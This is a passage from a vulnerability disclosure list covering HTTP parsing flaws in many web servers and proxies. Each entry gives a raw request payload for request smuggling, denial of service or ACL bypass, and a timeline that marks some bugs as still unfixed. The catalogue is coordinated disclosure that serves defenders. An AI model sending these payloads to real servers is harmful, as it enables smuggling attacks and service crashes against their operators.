    - July 7, 2023: Reported via [GH issue](https://github.com/h2o/h2o/issues/3250).
    - July 18, 2023: Fixed in [PR #3256](https://github.com/h2o/h2o/pull/3256)
2. Empty header names are preserved across HTTP/2 to HTTP/1.1 translation, leading to the production of invalid HTTP/1.1.
  - Use case: DoS
  - Requirements: H2O is acting as a transducer to an HTTP/1.1 backend, and its backend rejects empty header names (as most do).
  - Risk: Low. This bug can be used to make a reasonable server 400, which will break connection sharing.
  - Payload: `PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00=\x01\x05\x00\x00\x00\x01\x00\n:authority\tlocalhost\x00\x05:path\x01/\x00\x07:method\x03GET\x00\x07:scheme\x04http\x00\x00\x00`
  - Timeline:
    - July 7, 2023: Reported via [GH issue](https://github.com/h2o/h2o/issues/3250).
    - July 18, 2023: Fixed in [PR #3256](https://github.com/h2o/h2o/pull/3256)
3. Chunk-sizes are interpreted as their longest valid prefix.
  - Use case: Request smuggling
  - Requirements: A transducer that accepts and forwards `0x`-prefixed chunk-sizes.
  - Risk: High. See OpenBSD relayd bug 3, Pound bug 2, and Akamai bug 2.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n0_2e\r\n\r\nGET / HTTP/1.1\r\nHost: a\r\nContent-Length: 5\r\n\r\n0\r\n\r\n`
  - Timeline:
    - August 1, 2023: Reported via email.
    - December 12, 2023: Fixed in [PR](https://github.com/h2o/picohttpparser/pull/78).
4. Requests with multiple conflicting `Content-Length` headers are accepted, prioritizing the first.
  - Use case: Request smuggling
  - Requirements: A transducer that accepts and forwards requests with 2 `Content-Length` headers, prioritizing the last.
  - Risk: Medium. See OpenBSD relayd bug 7.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nContent-Length: 1\r\nContent-Length: 0\r\n\r\nZ`
  - Timeline:
    - November 30, 2023: Reported via email.
    - January 31, 2024: Remains unfixed.
5. `Content-Length` values are not validated when a `Transfer-Encoding: chunked` header is present.
  - Use case: ???
  - Requirements: N/A
  - Risk: None.
  - Payload: `POST / HTTP/1.1\r\nHost: a\r\nContent-Length: blahblahblah\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n`
  - Timeline:
    - February 3, 2024: Reported via [GH issue](https://github.com/h2o/h2o/issues/3342).
    - Feburary 3, 2024: Remains unfixed.

### HAProxy
1. Empty `Content-Length` headers are incorrectly forwarded, even in the presence of other `Content-Length` headers, as long as the empty `Content-Length` header comes first.
  - Use case: Request smuggling
  - Requirements: A server that interprets empty `Content-Length` values as 0 and accepts multiple `Content-Length` headers in incoming requests, prioritizing the first.
  - Risk: Medium. See WEBrick bug 1.
  - Payload: `GET / HTTP/1.1\r\nhost: whatever\r\ncontent-length: \r\ncontent-length: 59\r\n\r\nPOST /evil HTTP/1.1\r\nhost: whatever\r\ncontent-length: 34\r\n\r\nGET / HTTP/1.1\r\nhost: whatever\r\n\r\n`
  - Timeline:
    - August 2, 2023: Reported via [GH issue](https://github.com/haproxy/haproxy/issues/2237).
    - August 9, 2023: Reported smuggling PoC with Mongoose backend via email.
    - August 9, 2023: Fixed in [commit](https://github.com/haproxy/haproxy/commit/6492f1f29d738457ea9f382aca54537f35f9d856).
    - August 10, 2023: Assigned [CVE-2023-40225](https://www.cve.org/CVERecord?id=CVE-2023-40225).
2. `\x00` is forwarded in header values, and terminates strings that get matched with the `str` ACL rules.
  - Use case: ACL bypass
  - Requirements: A server that does not reject `\x00` in header values.
  - Risk: Medium. See OpenLiteSpeed bug 9, OpenBSD relayd bug 5, WEBrick bug 3, and REDACTED.
  - Payload: `GET / HTTP/1.1\r\nHost: google.com\x00.kallus.org\r\n\r\n`
  - Timeline:
    - September 19, 2023: Reported via email.
    - January 31, 2024: Fixed in [commit](https://github.com/haproxy/haproxy/commit/0d76a284b6abe90b7001284a5953f8f445c30ebe).
3. Bare `\n` is accepted as a chunk line terminator.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\na\r\n0123456789\n0\r\n\r\n`
  - Timeline:
    - January 25, 2024: Reported via email.
    - January 30, 2024: Fixed in commmits [7b737da](https://github.com/haproxy/haproxy/commit/7b737da8258ebdd84e702a2d65cfd3c423f8e96d) and [4837e99](https://github.com/haproxy/haproxy/commit/4837e998920cbd4e43026e0a638b8ebd71c8018f).

### Hyper
1. Empty chunk-sizes are treated as equivalent to 0.
  - Use case: Request smuggling
  - Requirements: A transducer that accepts and forwards extra `\r\n`s between chunks.
  - Risk: Low. I'm not aware of any such transducer.
  - Payload: `POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n\r\n\r\nGET / HTTP/1.1\r\nHost: a\r\n\r\n`
  - Timeline:
    - December 1, 2023: Reported via email.
    - December 18, 2023: Fixed in [commit](https://github.com/hyperium/hyper/commit/829153865a4d2bbb52227183c8857e57dc3e231b).

### Libevent
1. Integer overflow in HTTP version numbers.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `GET / HTTP/4294967295.255\r\n\r\n`
  - Timeline:
    - January 17, 2024: Submitted [PR](https://github.com/libevent/libevent/pull/1541).
    - January 18, 2024: PR merged.
2. `0x`, `+`, `-`, and whitespace prefixes are accepted in chunk-sizes.
  - Use case: Request smuggling
  - Requirements: A transducer that interprets chunk-sizes as their longest valid prefix, but forwards them as-is.
  - Risk: Medium. See Apache Traffic Server bug 5.
  - Payload: `GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n`
  - Timeline:
    - January 18, 2024: Submitted [PR](https://github.com/libevent/libevent/pull/1542).
    - February 3, 2024: Remains unfixed.
3. REDACTED
  - Use case: REDACTED
  - Requirements: REDACTED
  - Risk: Medium
  - Payload: REDACTED
  - Timeline:
    - January 29, 2024: Reported via [GH security advisory](https://github.com/libevent/libevent/security/advisories/GHSA-g8g4-m98c-cwgh).
    - January 31, 2024: Remains unfixed.

### Lighttpd
1. Empty `Content-Length` headers are improperly ignored.
  - Use case: Request smuggling
  - Requirements: A transducer that interprets empty `Content-Length` values as anything other than 0.
  - Risk: Low. I'm not aware of any such transducer.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nContent-Length: \r\n\r\n`
  - Timeline:
    - August 1, 2023: Reported via [issue tracker](https://redmine.lighttpd.net/issues/3219).
    - August 3, 2023: Fixed in [commit](https://redmine.lighttpd.net/projects/lighttpd/repository/14/revisions/d71fc70c8d45b7978f0226e6cdfe286fba34f1e7).

### Cesanta Mongoose
1. Negative `Content-Length` headers can be used to force the server into an infinite parsing loop.
  - Use case: DoS
  - Requirements: An attacker can send an HTTP request to your server. (Not a given because Mongoose is targeted at embedded systems)
  - Risk: High. This bug is trivial to exploit.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nContent-Length: -48\r\n\r\n`
  - Timeline:
    - April 27, 2023: Reported via email.
    - May 16-18, 2023: Fixed in commits [4663090](https://github.com/cesanta/mongoose/commit/4663090a8fb036146dfe77718cff612b0101cb0f), [926959a](https://github.com/cesanta/mongoose/commit/926959ab47e78302837bec864863d94dcb78a210), and [2669991](https://github.com/cesanta/mongoose/commit/26699914ccd4314903626afeb46621e066622fa0).
    - Assigned [CVE-2023-34188](https://www.cve.org/CVERecord?id=CVE-2023-34188).
2. The HTTP header block is truncated when Mongoose receives a header with no name.
  - Use case: Request smuggling
  - Requirements: A transducer that forwards empty header names.
  - Risk: High. See H2O bug 2.
  - Payload: `GET / HTTP/1.1\r\n:\r\nI: am chopped off\r\n\r\n`
  - Timeline:
    - June 26, 2023: Reported via [GH issue](https://github.com/cesanta/mongoose/issues/2275).
    - June 29, 2023: Fixed in [commit 415bbf2](https://github.com/cesanta/mongoose/commit/415bbf2932ba1da206aeefa7812621119ca70def).
3. HTTP header lines are incorrectly terminated on `\r`.
  - Use case: Request smuggling
  - Requirements: A transducer that forwards `\r` in header names.
  - Risk: High. See Google Cloud Classic Application Load Balancer bug 1, and OpenLiteSpeed bug 6.
  - Payload: `GET / HTTP/1.1\r\nWhatever: whatever\rContent-Length: 10\r\n\r\n0123456789`
  - Timeline:
    - July 7, 2023: Reported via [GH issue](https://github.com/cesanta/mongoose/issues/2292).
    - July 9, 2023: Fixed in [commit 6957c37](https://github.com/cesanta/mongoose/commit/6957c379d5c43115e6b2f1206c0c7f24172f7044).
4. HTTP header names and values can be separated by whitespace only, no `:` required.
  - Use case: Request smuggling
  - Requirements: A transducer that forwards header lines that don't contain a `:`.
  - Risk: Medium. See OpenLiteSpeed bug 12.
  - Payload: `GET / HTTP/1.1\r\nContent-Length 10\r\n\r\n0123456789`
  - Timeline:
    - July 7, 2023: Reported via [GH issue](https://github.com/cesanta/mongoose/issues/2293).
    - July 7, 2023: Fixed in [commit 5dff282](https://github.com/cesanta/mongoose/commit/5dff2821325f445b971777e405eac732f7158a39).
5. Invalid `Content-Length` headers are interpreted as equivalent to their longest valid prefix.
  - Use case: Request smuggling
  - Requirements: A transducer that forwards `Content-Length` values with `0x` or `+` prefixes.
  - Risk: High. See OpenBSD relayd bug 4, and Akamai bug 1.
  - Payload: `GET / HTTP/1.1\r\nContent-Length: 1Z\r\n\r\nZ`
  - Timeline:
    - July 31, 2023: Reported via [GH issue](https://github.com/cesanta/mongoose/issues/2322)
    - August 17, 2023: Fixed in [commit](https://github.com/cesanta/mongoose/commit/36fcb7ed210ce58715521f19aca5c566a5e6f58f).
4. Mongoose treats `,chunked` as not equal to `chunked`.
  - Use case: Request smuggling
  - Requirements: A transducer that forwards the `Transfer-Encoding` value `,chunked` as-is, and interprets it as equivalent to `chunked`.
  - Risk: High. See Azure CDN bug 1 and nghttpx bug 1.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nTransfer-Encoding: ,chunked\r\nContent-Length: 5\r\n\r\n0\r\n\r\n`
  - Timeline:
    - November 6, 2023: Reported via [GH issue](https://github.com/cesanta/mongoose/issues/2460).
    - December 1, 2023: Fixed in [commit](https://github.com/cesanta/mongoose/pull/2509/commits/4c445453d354fe4ab21e59beae327d9e38832d93).
5. Header values containing `"`, `(`, `)`, `,`, `/`, `;`, `<`, `=`, `>`, `?`, `@`, `[`, `\`, `]`, `{`, `}`, and the range `\xc0-\xef` are incorrectly permitted.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `GET / HTTP/1.1\r\n"(),/;<=>?@[/]{}\xc0\xef: yep\r\n\r\n`
  - Timeline:
    - October 13, 2023: Reported via [GH issue](https://github.com/cesanta/mongoose/issues/2425).
    - December 5, 2023: Fixed in [commit](https://github.com/cesanta/mongoose/commit/bd53e4687377af2c7d56ce69e3af289e59654cb0).
6. Message bodies are incorrectly terminated on `\r\n\r\n` instead of `0\r\n\r\n`.
  - Use case: Request smuggling
  - Requirements: A transducer that accepts and forwards extra `\r\n`s between chunks.
  - Risk: Low. I'm not aware of any such transducer.
  - Payload: `POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n\r\n\r\nGET / HTTP/1.1\r\nHost: a\r\n\r\n`
  - Timeline:
    - January 3, 2024: Reported via [GH issue](https://github.com/cesanta/mongoose/issues/2552).
    - Januar 3, 2024: Fixed in [PR](https://github.com/cesanta/mongoose/pull/2580).

### nghttpx
1. `Transfer-Encoding: ,chunked` headers are forwarded intact.
  - Use case: Request smuggling
  - Requirements: A server that both ignores unknown `Transfer-Encoding`s and treats `,chunked` as distinct from `chunked`.
  - Risk: High. See Gunicorn bug 6, Mongoose bug 4, OpenBSD relayd bug 2, and Phusion Passenger bug 1.
  - Payload: `POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: ,chunked\r\n\r\n0\r\n\r\n`
  - Timeline:
    - October 14, 2023: Reported via email.
    - October 17, 2023: Fixed in [PR](https://github.com/nghttp2/nghttp2/pull/1973).

### Node.js
1. The header block is incorrectly terminated on `\r\n\rX`, where `X` can be any byte.
  - Use case: ???
  - Requirements: A transducer that forwards header names beginning with `\r`, or allows `\r` as line-folding start-of-line whitespace.
  - Risk: Low. I'm not aware of such a transducer.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\n\rZGET /evil: HTTP/1.1\r\nHost: a\r\n\r\n`
  - Timeline:
    - July 7, 2023: Reported via [HackerOne report](https://hackerone.com/reports/2054283).
    - July 31, 2023: Fixed in [llhttp commit](https://github.com/nodejs/llhttp/commit/6d04465e8c98c57a17428bf7aa54cc9e0add30ff).
    - September 16, 2023: Fixed in [Node commit](https://github.com/nodejs/node/commit/e9ff81016dfcf183f4fcc2640497cb8b3365fdd7).
2. `Transfer-Encoding: chunked` chunks are incorrectly terminated on `\rX`, where `X` can be any byte.
  - Use case: Request smuggling.
  - Requirements: A transducer that forwards `\r` within the optional whitespace in a chunk-ext.
  - Risk: High. See Akamai bug 3, Apache Traffic Server bug 4, and Google Cloud bug 1.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n5\r\r;ABCD\r\n34\r\nE\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: a\r\nContent-Length: 5\r\n\r\n0\r\n\r\n`
  - Timeline:
    - July 9, 2023: Reported via [HackerOne comment](https://hackerone.com/reports/2054283).
    - July 31, 2023: Fixed in [llhttp commit](https://github.com/nodejs/llhttp/commit/6d04465e8c98c57a17428bf7aa54cc9e0add30ff).
    - September 16, 2023: Fixed in [Node commit](https://github.com/nodejs/node/commit/e9ff81016dfcf183f4fcc2640497cb8b3365fdd7).
3. Empty header names are erroneously accepted.
  - Use case: Request smuggling
  - Requirements: A transducer that accepts and forwards `\r\n:\r\n`, and treats it as the end of the header block.
  - Risk: Low. I'm not aware of any such transducer.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\n:\r\n\r\n`
  - Timeline:
    - October 13, 2023: Reported via [GH issue](https://github.com/nodejs/llhttp/issues/257).
    - October 17, 2023: Fixed in [commit](https://github.com/nodejs/llhttp/commit/10ff94eb252e0e7cb792dcde6d40d0e46b794f8a).

### OpenLiteSpeed
1. OLS interprets empty `Content-Length` header values as though they were `0`.
  - Use case: Request smuggling
  - Requirements: A server that interprets empty `Content-Length` values as anything other than 0
  - Risk: Medium. See Puma bug 1.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nContent-Length: \r\n\r\n`
  - Timeline:
    - July 31, 2023: Reported via email.
    - August 10, 2023: Fixed in OLS 1.7.18.
2. OLS interprets `Content-Length` as its longest valid (modulo bug 3) prefix headers.
  - Use case: Request smuggling
  - Requirements: A transducer that forwards invalid `Content-Length` values, but doesn't interpret them as their longest valid prefix.
  - Risk: Low. I'm not aware of any such transducer.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nContent-Length: 1abc\r\n\r\nZ`
  - Timeline:
    - July 31, 2023: Reported via email.
    - August 10, 2023: Fixed in OLS 1.7.18.
3. OLS interprets C-style octal and hex literals (i.e. leading `0` and `0x` are misinterpreted) in `Content-Length` headers.
  - Use case: Request smuggling
  - Requirements: A transducer that forwards leading `0`s in `Content-Length` values, which is permitted by the standard.
  - Risk: High. This is exploitable against standards-compliant transducers.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nContent-Length: 010\r\n\r\n01234567`
  - Timeline:
    - July 31, 2023: Reported via email.
    - August 10, 2023: Fixed in OLS 1.7.18.
4. OLS strips whitespace from the ends of header names.
  - Use case: Request smuggling
  - Requirements: A transducer that allows whitespace within header names.
  - Risk: Low. I'm not aware of any such transducer.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nContent-Length : 1\r\n\r\nZ`
  - Timeline:
    - July 31, 2023: Reported via email.
    - August 10, 2023: Fixed in OLS 1.7.18.
    - August 14, 2023: Assigned [CVE-2023-40518](https://www.cve.org/CVERecord?id=CVE-2023-40518).
5. OLS allows `\x00` in header names.
  - Use case: ???
  - Requirements: A transducer that forwards `\x00` in header names.
  - Risk: Low. I'm not aware of any such transducer.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nHea\x00der: value\r\n\r\n`
  - Timeline:
    - July 31, 2023: Reported via email.
    - August 10, 2023: Fixed in OLS 1.7.18.
6. OLS allows `\r` in header values.
  - Use case: ???
  - Requirements: A transducer that misinterprets and forwards `\r` in header values.
  - Risk: Low. I'm not aware of any such transducer.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nHeader: va\rlue\r\n\r\n`
  - Timeline:
    - July 31, 2023: Reported via email.
    - August 10, 2023: Fixed in OLS 1.7.18.
7. OLS permits `+`-prefixed `Content-Length` header values.
  - Use case: Request smuggling
  - Requirements: A transducer that interprets `Content-Length` values as their longest valid prefix, but forwards them as-is.
  - Risk: Low. I'm not aware of any vulnerable transducers, but Matt Grenfeldt [says that at least one exists](https://grenfeldt.dev/2021/10/08/gunicorn-20.1.0-public-disclosure-of-request-smuggling/).
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nContent-Length: +1\r\n\r\nZ`
  - Timeline:
    - July 31, 2023: Reported via email.
    - August 10, 2023: Fixed in OLS 1.7.18.
8. OLS permits `0x`-prefixed chunk-sizes.
  - Use case: Request smuggling
  - Requirements: A transducer that interprets chunk-size values as their longest valid prefix, but forwards them as-is.
  - Risk: Medium. See Apache Traffic Server bug 5.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nTransfer-Encoding: chunked\r\n\r\n0x1\r\nZ\r\n0\r\n\r\n`
  - Timeline:
    - August 2, 2023: Reported via email.
    - August 11, 2023: Fixed in OLS 1.7.18.
9. OLS truncates header values at `\x00`.
  - Use case: ACL bypass
  - Requirements: A transducer that forwards `\x00` in header values.
  - Risk: Medium. See HAProxy bug 2.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nTest: test\x00THESE BYTES GET DROPPED\r\nConnection: close\r\n\r\n`
  - Timeline:
    - November 3, 2023: Reported via email.
    - January 31, 2024: Remains unfixed.
10. OLS ignores field-lines with no `:`.
  - Use case: ???
  - Requirements: A transducer that forwards field lines with no `:`.
  - Risk: None
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nTest\r\nConnection: close\r\n\r\n`
  - Timeline:
    - November 3, 2023: Reported via email.
    - January 31, 2024: Remains unfixed.
11. OLS, when acting as a proxy, forwards requests containing `\x00` in header values.
  - Use case: ???
  - Requirements: N/A (Unknown if HAProxy has ACL capabilities)
  - Risk: Unkown
  - Payload: printf `GET / HTTP/1.1\r\nHost: whatever\r\nTest: t\n\x00st\r\nConnection: close\r\n\r\n`
  - Timeline:
    - November 3, 2023: Reported via email.
    - January 31, 2024: Remains unfixed.
12. OLS, when acting as a proxy, forwards requests with `\n`s in header names.
  - Use case: Request smuggling
  - Requirements: A backend server that misinterprets header field lines with no `:`.
  - Risk: Medium. See Phusion Passenger bug 2 and Mongoose bug 4.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nTe\nst: test\r\nConnection: close\r\n\r\n`
  - Timeline:
    - November 3, 2023: Reported via email.
    - January 31, 2024: Remains unfixed.
13. OLS, when acting as a proxy, forwards requests containing both `Content-Length` and `Transfer-Encoding` headers if the `Transfer-Encoding` value is prefixed with a comma.
  - Use case: Request smuggling
  - Requirements: A backend server that treats `,chunked` as equivalent to `chunked`, and prioritizes `Transfer-Encoding` over `Content-Length`. These behaviors are allowed by the standards.
  - Risk: High. This allows request smuggling to standards-compliant servers.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nTransfer-Encoding: ,chunked\r\nContent-Length: 5\r\nConnection: close\r\n\r\n0r\n\r\n`
  - Timeline:
    - November 3, 2023: Reported via email.
    - January 31, 2024: Remains unfixed.
14. OLS, when acting as a proxy, does not normalize `\n` to `\r\n`.
  - Use case: Request smuggling
  - Requirements: A backend server that does not interpret `\n` as a line ending in header lines. The standard allows servers to translate `\n` to ` `.
  - Risk: High. This bug is exploitable against standards-compliant servers.
  - Payload: `GET / HTTP/1.1\nHost: whatever\nConnection: close\n\n`
  - Timeline:
    - November 3, 2023: Reported via email.
    - January 31, 2024: Remains unfixed.
15. OLS, when acting as a proxy, translates chunked message bodies containing an extra `\r\n` before the terminator chunk without replacing the `Transfer-Encoding` header with `Content-Length`.
  - Use case: Request smuggling
  - Requirements: None.
  - Risk: High. This bug is exploitable against arbitrary backend servers.
  - Payload: `POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n17\r\n0\r\n\r\nGET / HTTP/1.1\r\n\r\n\r\n\r\n0\r\n\r\n`
  - Timeline:
    - November 30, 2023: Reported via email.
    -January 31, 2024: Remains unfixed.

### OpenBSD httpd
1. When OpenBSD httpd receives a request with a chunked message body when FastCGI is enabled, sending an extra byte after the end of the message body will segfault the worker process due to a null pointer dereference, which causes the parent process to exit 0.
  - Use case: DoS
  - Requirements: FastCGI is enabled.
  - Risk: High. This is a trivial-to-exploit bug that crashes the server.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n\x00`
  - Timeline:
    - November 1, 2023: Reported via email.
    - November 8, 2023: Fixed in [commit](https://github.com/openbsd/src/commit/76ed904538b7966e735c4736a6e2cf7222ad67cf).
2. When OpenBSD httpd receives a request with a chunked message body when FastCGI is enabled, the message body is bizarrely echoed back before the response is sent.
  - Use case: DoS
  - Requirements: FastCGI is enabled.
  - Risk: Medium. This will invalidate the request stream for any chunked message, which will ruin shared connections.
  - Payload: `POST / HTTP/1.1\r\nHost: whatever\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\rn\`
  - Timeline:
    - January 4, 2024: Reported via email.
    - January 31, 2024: Remains unfixed.

### OpenBSD relayd
1. relayd forwards every invalid byte, except `\x00`, `\n`, and ":" in header names.
  - Use case: Request smuggling.
  - Requirements: A backend server that interprets ` ` in header names as equivalent to `:`.
  - Risk: Medium. See Mongoose bug 4.
  - Payload: `GET / HTTP/1.1\r\nHost: fanout\r\nHeader\x85: value\r\n\r\n`
  - Timeline:
    - November 10, 2023: Reported via email.
    - November 28, 2023: Patched in [commit](https://github.com/openbsd/src/commit/1c543edce21c8c1ee56ef648930b92ca57a28d4f).
2. relayd treats `,chunked` as not equal to `chunked`, and forwards it intact.
  - Use case: Request smuggling
  - Requirements: A server that interprets `,chunked` as equivalent to `chunked`, which the standard says you MAY do.
  - Risk: High. This is a request smuggling vulnerability that is usable against standards-compliant backends.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nTransfer-Encoding: ,chunked\r\nContent-Length: 5\r\n\r\n0\r\n\r\n`
  - Timeline:
    - November 10, 2023: Reported via email.
    - November 28, 2023: Patched in [commit](https://github.com/openbsd/src/commit/1c543edce21c8c1ee56ef648930b92ca57a28d4f).
3. relayd accepts and forwards ,`+`, `-`, and `0x`-prefixed chunk-sizes.
  - Use case: Request smuggling
  - Requirements: A server that interprets chunk sizes as their longest valid prefix.
  - Risk: High. See WEBrick bug 2, Apache Traffic Server bug 5, H2O bug 3.
  - Payload: `POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n-0x0\r\n\r\n`
  - Timeline:
    - November 10, 2023: Reported via email.
    - November 28, 2023: Patched in [commit](https://github.com/openbsd/src/commit/1c543edce21c8c1ee56ef648930b92ca57a28d4f).
4. relayd accepts and forwards `+` and `-` prefixed `Content-Length` values.
  - Use case: Request smuggling
  - Requirements: A server that interprets `Content-Length` as its longest valid prefix.
  - Risk: Medium. See Mongoose bug 5.
  - Payload: `POST / HTTP/1.1\r\nContent-Length: +0\r\n\r\n`
  - Timeline:
    - November 28, 2023: Reported via email.
    - November 28, 2023: Patched in [commit](https://github.com/openbsd/src/commit/1c543edce21c8c1ee56ef648930b92ca57a28d4f).
5. relayd concatenates headers containing `\x00` or `\n` into the previous header's value.
  - Use case: Request smuggling
  - Requirements: Any standards-compliant backend server.
  - Risk: High. This is a generic request smuggling vulnerability.
  - Payload: `GET / HTTP/1.1\r\na:b\r\nc\x00\r\n\r\n`
  - Timeline:
    - November 10, 2023: Reported via email.
    - November 29, 2023: Patched in [commit](https://github.com/openbsd/src/commit/eefb3de5799409f8689b849d8a069ad293a002c0).
6. relayd forwards `GET` requests with `Content-Length` headers intact, but strips their message bodies.
  - Use case: Request smuggling
  - Requirements: Any standards-compliant backend server.
  - Risk: High. This is a generic request smuggling vulnerability.
  - Payload: `GET / HTTP/1.1\r\nContent-Length: 10\r\n\r\n1234567890`
  - Timeline:
    - November 28, 2023: Reported via email.
    - December 1, 2023: Patched in [commit](https://github.com/openbsd/src/commit/f537694384c3e3ea254eafa0a11f77c5c3e9c1a2).
7. relayd forwards requests containing multiple `Content-Length` headers, prioritizing the last.
  - Use case: Request smuggling
  - Requirements: A server that accepts requests containing multiple `Content-Length` headers, prioritizing the first.
  - Risk: High. See H2O bug 4.
  - Payload: `POST / HTTP/1.1\r\nHost: a\r\nContent-Length: 0\r\nContent-Length: 31\r\n\r\nGET /evil HTTP/1.1\r\nHost: a\r\n\r\n`
  - Timeline:
    - November 30, 2023: Reported via email.
    - January 31, 2024: Remains unfixed.
8. relayd forwards requests containing both `Content-Length` and `Transfer-Encoding` headers.
  - Use case: Request smuggling
  - Requirements: A server that prioritizes `Content-Length` over `Transfer-Encoding`, or does not support `Transfer-Encoding: chunked`.
  - Risk: High. This is the classic request smuggling vector.
  - Payload: `POST / HTTP/1.1\r\nHost: a\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n`
  - Timeline:
    - November 30, 2023: Reported via email.
    - January 31, 2024: Remains unfixed.
9. relayd forwards requests containing whitespace-prefixed chunk-sizes.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n           0\r\n\r\n`
  - Timeline:
    - November 30, 2023: Reported via email.
    - January 31, 2024: Remains unfixed.

### Phusion Passenger
1. Passenger treats `,chunked` as not equal to `chunked`.
  - Use case: request smuggling.
  - Requirements: A transducer that forwards either multiple `Transfer-Encoding` headers, or forwards `Transfer-Encoding: ,chunked` as-is, and treats it as equivalent to `Transfer-Encoding: chunked`.
  - Risk: High. See Azure CDN bug 1 and Pound bug 1.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nTransfer-Encoding: ,chunked\r\nContent-Length: 5\r\n\r\n0\r\n\r\n`
  - Timeline:
    - November 6, 2023: Reported via email.
    - January 31, 2024: Remains unfixed.
2. Passenger allows header names to be continued across lines.
  - Use case: request smuggling.
  - Requirements: A transducer that forwards header lines that don't contain a `:`.
  - Risk: Medium. See OpenLiteSpeed bug 12.
  - Payload: `POST / HTTP/1.1\r\nHost: whatever\r\nTransfer-\r\nEncoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n\r\n`
  - Timeline:
    - November 6, 2023: Reported via email.
    - January 31, 2024: Remains unfixed.

### Pound
1. Pound forwards requests containing multiple `Transfer-Encoding: chunked` headers.
  - Use case: Request smuggling
  - Requirements: A server that treats multiple `Transfer-Encoding: chunked` headers as not equivalent to no `Transfer-Encoding: chunked`, or joins multiple `Transfer-Encoding` headers, and treats `chunked,chunked` as distinct from `chunked`.
  - Risk: Medium. See Phusion Passenger bug 1 and REDACTED.
  - Payload: `POST / HTTP/1.1\r\nHost: whatever\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n`
  - Timeline:
    - October 7, 2023: Reported via [GH issue](https://github.com/graygnuorg/pound/issues/18).
    - October 12, 2023: Fixed in [commit](https://github.com/graygnuorg/pound/commit/8d86d52d0bc65534c33018b0a01996081d23b89e).
2. Pound forwards requests constaining `0x`-prefixed chunk-sizes.
  - Use case: Request smuggling
  - Requirements: A server that interprets chunk sizes as their longest valid prefix.
  - Risk: High. See WEBrick bug 2, Apache Traffic Server bug 5, H2O bug 3.
  - Payload: `POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n-0x0\r\n\r\n`
  - Timeline:
    - October 10, 2023: Reported via [GH issue](https://github.com/graygnuorg/pound/issues/19).
    - October 11, 2023: Fixed via commits [60a4f42](https://github.com/graygnuorg/pound/commit/60a4f42b2a1f901aec9746cde56c2f19a4a1a332) and [f70db92](https://github.com/graygnuorg/pound/commit/f70db92c126fffaab62b1f003413d8bdd93e45b0).
3. Pound forwards requests with whitespace-prefixed chunk-sizes.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `POST / HTTP/1.1\r\nHost: whatever\r\nTransfer-Encoding: chunked\r\n\r\n\t0\r\n\r\n`
  - Timeline:
    - October 15, 2023: Reported via [GH issue](https://github.com/graygnuorg/pound/issues/20).
    - November 25, 2023: Fixed in [commit](https://github.com/graygnuorg/pound/commit/387013528023bb0f2950959d15f5ae538ac23737).
4. Pound forwards requests with both `Content-Length` and `Transfer-Encoding` if the `Transfer-Encoding` value is unrecognized.
  - Use case: Request smuggling
  - Requirements: A backend server that misinterprets `Transfer-Encoding` that Pound does not see as `chunked` to be `chunked`, for example by stripping whitespace.
  - Risk: Medium. See REDACTED, REDACTED, and REDACTED.
  - Payload: `POST / HTTP/1.1\r\nHost: whatever\r\nTransfer-Encoding: chunked\r\n\r\n\t0\r\n\r\n`
  - Timeline:
    - February 4, 2024: Reported via [GH issue](https://github.com/graygnuorg/pound/issues/26).
    - February 4, 2024: Remains unfixed.

### Puma
1. The `Content-Length` header value is improperly validated by checking that the value does not match `/[^\d]/`. Thus, empty `Content-Length` headers can sneak by the parser. Puma interprets an empty `Content-Length` header in a request to mean that all bytes sent after the header block are in the request body.
